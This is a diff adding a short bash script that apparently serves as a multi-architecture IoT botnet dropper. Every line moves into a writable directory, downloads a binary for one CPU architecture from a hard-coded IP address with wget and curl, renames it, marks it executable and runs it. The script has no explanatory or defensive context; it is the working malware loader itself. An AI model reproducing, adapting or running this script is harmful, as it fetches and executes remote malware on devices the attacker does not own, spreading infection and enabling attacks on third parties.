@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.x86; curl -O http://185.12.177.153/bins/ssh.x86;cat ssh.x86 >allah;chmod +x *;./allah root
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.mips; curl -O http://185.12.177.153/bins/ssh.mips;cat ssh.mips >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.mpsl; curl -O http://185.12.177.153/bins/ssh.mpsl;cat ssh.mpsl >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.arm4; curl -O http://185.12.177.153/bins/ssh.arm4;cat ssh.arm4 >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.arm5; curl -O http://185.12.177.153/bins/ssh.arm5;cat ssh.arm5 >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.arm6; curl -O http://185.12.177.153/bins/ssh.arm6;cat ssh.arm6 >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.arm7; curl -O http://185.12.177.153/bins/ssh.arm7;cat ssh.arm7 >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.ppc; curl -O http://185.12.177.153/bins/ssh.ppc;cat ssh.ppc >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.m68k; curl -O http://185.12.177.153/bins/ssh.m68k;cat ssh.m68k >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.arc; curl -O http://185.12.177.153/bins/ssh.arc;cat ssh.arc >allah;chmod +x *;./allah ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.12.177.153/bins/ssh.sh4; curl -O http://185.12.177.153/bins/ssh.sh4;cat ssh.sh4 >allah;chmod +x *;./allah ssh
